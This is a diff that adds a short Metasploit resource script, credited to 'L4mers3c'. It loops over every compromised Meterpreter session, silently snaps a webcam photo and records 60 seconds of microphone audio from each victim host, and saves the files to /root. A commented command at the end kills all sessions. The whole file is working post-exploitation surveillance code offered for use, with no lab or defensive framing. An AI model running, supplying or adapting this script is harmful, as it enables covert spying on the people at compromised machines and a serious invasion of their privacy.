@@ -1,0 +1,32 @@
+####################################################
+# Author:L4mers3c                                  #
+# Description: Resource file to check for webcam   #
+# and will also record mic.                        #
+####################################################
+
+<ruby>
+        sleep(1)
+
+        print_status("Checking to see if we have any sessions...")
+        if (framework.sessions.length > 0)
+                framework.sessions.each_pair do |sid,s|
+                        thost = s.session_host
+
+                        # Ensure that stdapi has been loaded before running
+                        if s.ext.aliases['stdapi']
+                                print_status("Taking webcam shot for host #{thost}_session_#{sid}")
+                                s.console.run_single("webcam_snap -p /root/#{thost}_#{sid}.jpg -v false")
+                print_status("Recording mic for 60 seconds for host #{thost}_session_#{sid}")
+                s.console.run_single("record_mic -d 60 -f /root/#{thost}_#{sid}.wav -p false")
+                        else
+                                print_status("Session #{sid} on #{thost} active, but not yet configured")
+                        end
+
+                end
+                sleep(1)
+        end
+      print_status("All done")
+</ruby>
+
+# Kill all open sessions
+# sessions -K
